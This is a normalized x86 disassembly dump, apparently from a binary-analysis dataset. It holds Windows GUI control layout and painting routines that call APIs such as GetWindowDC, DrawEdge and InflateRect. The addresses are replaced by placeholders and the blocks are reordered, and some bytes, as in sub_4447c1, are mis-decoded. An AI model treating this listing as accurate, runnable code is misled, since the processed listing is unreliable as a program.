sub_4441b8
push ebp
mov ebp esp
push esi
mov esi edx
mov edx [ ebp + 0x8 ]
push edx
xor dl 0x1
push edx
mov edx esi
call sub_4440ac
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0xd4 ]
sub_4441e4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43ff78
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43ff3c
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_44422c
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_443884
pop esi
pop ebx
retn
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_43c3bc
sub_444274
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi eax
mov eax [ esi + 0x74 ]
cmp [ eax + 0x14 ] 0x0
jbe r-xdata
xor ebx ebx
mov [ edx ] ebx
mov ebx [ esi + 0x74 ]
mov ebx [ ebx + 0x14 ]
mov [ edx ] ebx
jmp r-xdata
xor ebx ebx
mov [ ecx ] ebx
mov ebx [ esi + 0x74 ]
mov ebx [ ebx + 0x10 ]
mov [ ecx ] ebx
jmp r-xdata
cmp [ eax + 0x10 ] 0x0
jbe r-xdata
mov ebx [ ebp + 0xc ]
xor edi edi
mov [ ebx ] edi
mov ebx [ esi + 0x74 ]
mov ebx [ ebx + 0xc ]
mov edi [ ebp + 0xc ]
mov [ edi ] ebx
jmp r-xdata
cmp [ eax + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ eax ] ebx
mov eax [ esi + 0x74 ]
mov eax [ eax + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
jmp r-xdata
cmp [ eax + 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ esi + 0x78 ]
mov eax [ eax + 0x8 ]
mov ebx [ esi + 0x78 ]
add eax [ ebx + 0x10 ]
cmp [ edx ] 0x0
jle r-xdata
test [ esi + 0x52 ] 0x10
je r-xdata
mov ebx [ ebp + 0xc ]
cmp eax [ ebx ]
jg r-xdata
add [ edx ] eax
mov eax [ esi + 0x78 ]
mov eax [ eax + 0xc ]
mov ebx [ esi + 0x78 ]
add eax [ ebx + 0x14 ]
cmp [ ecx ] 0x0
jle r-xdata
mov ebx [ ebp + 0xc ]
sub [ ebx ] eax
mov ebx [ ebp + 0x8 ]
cmp eax [ ebx ]
jg r-xdata
add [ ecx ] eax
mov ebx [ ebp + 0x8 ]
sub [ ebx ] eax
sub_444338
push ebp
mov ebp esp
add esp 0xffffffa0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_443f88
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax esi
call sub_43ff78
test eax eax
je r-xdata
lea edx [ ebp - 0x5e ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x5e ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x90 ]
lea eax [ ebp - 0x5e ]
push eax
call IsRectEmpty
test eax eax
jne r-xdata
mov eax [ esi + 0x78 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x56 ]
sub edx [ ebp - 0x5e ]
sub eax edx
mov [ ebp - 0xc ] eax
mov eax [ esi + 0x78 ]
mov edx 0x3
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x52 ]
sub edx [ ebp - 0x5a ]
sub eax edx
mov [ ebp - 0x10 ] eax
mov eax [ esi + 0x78 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x56 ]
sub edx [ ebp - 0x5e ]
sub eax edx
mov [ ebp - 0x14 ] eax
mov eax [ esi + 0x78 ]
mov edx 0x3
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x52 ]
sub edx [ ebp - 0x5a ]
sub eax edx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
sub [ eax ] edx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
sub [ eax ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
sub [ eax ] edx
xor eax eax
push ebp
push sub_4447aa
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_43ff78
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax ] edx
cmp [ ebp - 0x20 ] 0x0
jle r-xdata
inc edi
mov [ ebp - 0x1c ] 0x0
cmp [ ebp - 0x24 ] 0x0
jle r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx ]
jle r-xdata
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x48 ]
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_444274
movzx eax [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebp - 0x28 ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
movzx eax [ ebx + 0x61 ]
and al [ r-xdata ]
movzx edx [ r-xdata ]
cmp dl al
jne r-xdata
sub al 0x2
jb r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
jle r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
cmp eax [ edx ]
jle r-xdata
mov [ ebp - 0x4d ] 0x0
jmp r-xdata
mov [ ebp - 0x4d ] 0x1
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
mov [ ebp - 0x4d ] 0x1
jmp r-xdata
sub al 0x2
je r-xdata
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_43ff3c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
movzx eax [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov eax [ ebx + 0x78 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x56 ]
sub edx [ ebp - 0x5e ]
sub edx eax
sub edx [ ebp - 0x40 ]
mov [ ebp - 0x40 ] edx
mov [ ebp - 0x4d ] 0x2
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
add [ eax ] edx
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jle r-xdata
movzx eax [ ebx + 0x61 ]
and al [ r-xdata ]
movzx edx [ r-xdata ]
cmp dl al
jne r-xdata
add al 0xfe
sub al 0x2
jb r-xdata
mov eax [ ebx + 0x78 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x56 ]
sub edx [ ebp - 0x5e ]
add edx [ ebp - 0x44 ]
sub edx eax
mov [ ebp - 0x44 ] edx
jmp r-xdata
mov [ ebp - 0x4d ] 0x3
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
add [ eax ] edx
mov [ ebp - 0x4e ] 0x0
jmp r-xdata
mov [ ebp - 0x4e ] 0x1
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
mov [ ebp - 0x4e ] 0x1
jmp r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
movzx eax [ ebp - 0x4d ]
dec eax
sub al 0x2
jb r-xdata
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov eax [ ebx + 0x78 ]
mov edx 0x3
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x52 ]
sub edx [ ebp - 0x5a ]
sub edx eax
sub edx [ ebp - 0x48 ]
mov [ ebp - 0x48 ] edx
mov [ ebp - 0x4e ] 0x2
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax ] edx
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
je r-xdata
mov eax [ ebx + 0x78 ]
mov edx 0x3
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x52 ]
sub edx [ ebp - 0x5a ]
add edx [ ebp - 0x4c ]
sub edx eax
mov [ ebp - 0x4c ] edx
jmp r-xdata
mov [ ebp - 0x4e ] 0x3
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
cmp eax [ ebp - 0x40 ]
jge r-xdata
mov eax [ ebx + 0x78 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x10 ]
add [ ebp - 0x30 ] eax
mov eax [ ebx + 0x78 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x10 ]
add [ ebp - 0x34 ] eax
jmp r-xdata
movzx eax [ ebp - 0x4e ]
dec eax
sub al 0x2
jb r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax ]
cmp eax [ ebp - 0x44 ]
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x40 ]
mov [ eax ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
cmp eax [ ebp - 0x20 ]
jle r-xdata
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
je r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x44 ]
mov [ eax ] edx
mov eax [ ebp + 0xc ]
mov eax [ eax ]
cmp eax [ ebp - 0x24 ]
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x48 ]
jge r-xdata
mov eax [ ebx + 0x78 ]
mov edx 0x3
mov ecx [ eax ]
call [ ecx + 0x10 ]
add [ ebp - 0x38 ] eax
mov eax [ ebx + 0x78 ]
mov edx 0x3
mov ecx [ eax ]
call [ ecx + 0x10 ]
add [ ebp - 0x3c ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov [ ebp - 0x24 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x4c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x48 ]
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x28 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4c ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x2c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x2c ] eax
jmp r-xdata
sub_4447c1
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_444338
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_43d29c
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_444800
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_43e67c
mov eax esi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0x74 ]
mov eax edi
call sub_43ba20
cmp [ edi + 0x160 ] 0x0
jne r-xdata
sub_444848
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43e880
mov eax esi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx [ ebx + 0x160 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_444878
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
call sub_443f88
test al al
je r-xdata
movzx eax [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc0 ]
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x90 ]
mov eax [ ebp - 0x4 ]
call sub_43fa94
xor edx edx
push ebp
push sub_4449a6
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_43ff78
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_43ff78
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4449ad
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_43fa9c
retn
inc ebx
mov [ ebp - 0x14 ] 0x0
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x5b ]
test dl dl
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov esi [ ebp - 0x24 ]
sub esi [ ebp - 0x34 ]
jmp r-xdata
add dl 0xfd
sub dl 0x2
jae r-xdata
inc [ ebp - 0x14 ]
dec ebx
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x5b ]
sub dl 0x3
jae r-xdata
xor esi esi
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_43ff3c
cmp [ eax + 0x57 ] 0x0
jne r-xdata
xor edi edi
mov edi [ ebp - 0x20 ]
sub edi [ ebp - 0x30 ]
jmp r-xdata
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
sub ecx edi
mov edx [ eax + 0x40 ]
sub edx esi
mov esi [ eax ]
call [ esi + 0x88 ]
sub_4449ad
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x5b ]
mov eax edx
test al al
je r-xdata
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x24 ]
test eax eax
jle r-xdata
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x48 ]
mov ecx [ ebp - 0x2c ]
sub ecx [ ebp - 0x34 ]
sub eax ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] eax
cmp dl 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x5b ]
mov eax edx
sub al 0x3
jae r-xdata
movzx eax [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x5c ]
jmp r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x4c ]
mov ecx [ ebp - 0x28 ]
sub ecx [ ebp - 0x30 ]
sub eax ecx
mov ecx [ ebp - 0xc ]
mov [ ecx ] eax
cmp dl 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x5c ]
jmp r-xdata
sub_444a40
sub edx 0x1
jb r-xdata
cmp cl [ eax + 0x193 ]
je r-xdata
je r-xdata
retn
mov [ eax + 0x193 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_43d400
retn
cmp cl [ eax + 0x194 ]
je r-xdata
jmp r-xdata
mov [ eax + 0x194 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_43d400
sub_444a84
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
movzx eax [ ebx + 0x192 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebx
retn
movzx eax [ esp ]
mov [ ebx + 0x192 ] al
push 0x0
xor ecx ecx
mov edx 0xb03b
mov eax ebx
call sub_43d400
sub_444ad4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ esi + 0x8 ]
mov esi eax
mov eax [ ebx + 0x19c ]
neg eax
push eax
mov edx [ ebx + 0x19c ]
neg edx
push eax
mov edi esi
push edi
call InflateRect
cmp [ ebx + 0x195 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
xor eax eax
cmp [ ebx + 0x193 ] 0x0
je r-xdata
cmp [ ebx + 0x194 ] 0x0
je r-xdata
add eax [ ebx + 0x198 ]
mov esi edi
test [ ebx + 0x192 ] 0x1
je r-xdata
add eax [ ebx + 0x198 ]
test [ ebx + 0x192 ] 0x2
je r-xdata
add [ esi ] eax
test [ ebx + 0x192 ] 0x4
je r-xdata
add [ esi + 0x4 ] eax
test [ ebx + 0x192 ] 0x8
je r-xdata
sub [ esi + 0x8 ] eax
sub [ esi + 0xc ] eax
sub_444b64
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x195 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_443be8
push eax
call GetWindowDC
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_444e17
push [ fs : ecx ]
mov [ fs : ecx ] esp
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_443be8
push eax
call GetClientRect
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_443be8
push eax
call GetWindowRect
push 0x2
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_443be8
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call ExcludeClipRect
lea esi [ ebp - 0x2c ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
push eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call InflateRect
lea esi [ ebp - 0x1c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_443be8
push eax
call GetWindowLongA
mov ebx eax
test ebx 0x200000
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x19c ] 0x0
jbe r-xdata
test ebx 0x100000
je r-xdata
push 0x14
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x24 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
call sub_42f0b8
call sub_42f1c0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x195 ] 0x0
je r-xdata
push 0x15
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x20 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x52 ] 0x2
je r-xdata
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call IntersectClipRect
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
cmp eax 0x1
jne r-xdata
xor esi esi
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x193 ]
test dl dl
je r-xdata
call sub_42f0b8
xor ecx ecx
mov edx [ ebp - 0x4 ]
call sub_42f78c
lea edx [ ebp - 0x1c ]
push edx
mov edx [ ebp - 0x8 ]
push eax
call GetRgnBox
push 0x2
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_443be8
push eax
push 0x0
call MapWindowPoints
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call IntersectRect
mov eax [ ebp - 0x38 ]
neg eax
push eax
mov eax [ ebp - 0x3c ]
neg eax
push eax
lea eax [ ebp - 0x2c ]
push eax
call OffsetRect
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x2c ]
push eax
call OffsetRect
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x194 ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
add esi [ eax + 0x198 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1a4 ]
call sub_423efc
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call FillRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_443be8
push eax
call ReleaseDC
retn
mov ecx [ ebp - 0x4 ]
test [ ecx + 0x192 ] 0x1
je r-xdata
mov ecx [ ebp - 0x4 ]
add esi [ ecx + 0x198 ]
mov ecx [ ebp - 0x4 ]
test [ ecx + 0x192 ] 0x2
je r-xdata
sub [ ebp - 0x2c ] esi
mov ecx [ ebp - 0x4 ]
test [ ecx + 0x192 ] 0x4
je r-xdata
sub [ ebp - 0x28 ] esi
mov ecx [ ebp - 0x4 ]
test [ ecx + 0x192 ] 0x8
je r-xdata
add [ ebp - 0x24 ] esi
mov ecx [ ebp - 0x4 ]
movzx ecx [ ecx + 0x192 ]
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x195 ]
or ecx [ ebx * 4 + rw-data ]
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x1d9 ]
or ecx [ ebx * 4 + rw-data ]
or ecx 0x2000
push ecx
and edx 0x7f
mov edx [ edx * 4 + rw-data ]
and eax 0x7f
or edx [ eax * 4 + rw-data ]
push edx
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call DrawEdge
add [ ebp - 0x20 ] esi
sub_444e58
push ebx
push esi
push edi
add esp 0xffffffec
mov ebx edx
mov esi eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
movsx eax [ esp ]
mov [ esp + 0x4 ] eax
movsx eax [ esp + 0x2 ]
mov [ esp + 0x8 ] eax
push 0x0
push 0x0
lea ecx [ esp + 0x14 ]
lea edx [ esp + 0xc ]
mov eax esi
call sub_43bc78
lea edx [ esp + 0x14 ]
xor ecx ecx
mov eax esi
call sub_440d20
mov edi eax
test edi edi
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx 0x7b
mov eax edi
call sub_43d400
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax esi
call sub_43eac8
sub_444ed0
push ebx
mov ebx edx
mov dl 0x1
call sub_44e778
test eax eax
je r-xdata
pop ebx
retn
sub bx 0x9
je r-xdata
push 0x0
mov ecx 0x10002
mov edx 0x127
call sub_43d400
jmp r-xdata
sub bx 0x9
je r-xdata
push 0x0
mov ecx 0x20002
mov edx 0x127
call sub_43d400
add ebx 0xffffffed
sub bx 0x4
jae r-xdata
sub_444f1c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x1
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
test [ eax + 0x8 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_444f85
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_441598
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call RestoreDC
retn
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_444fb0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_444fa8
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
sub_445008
push esi
mov esi eax
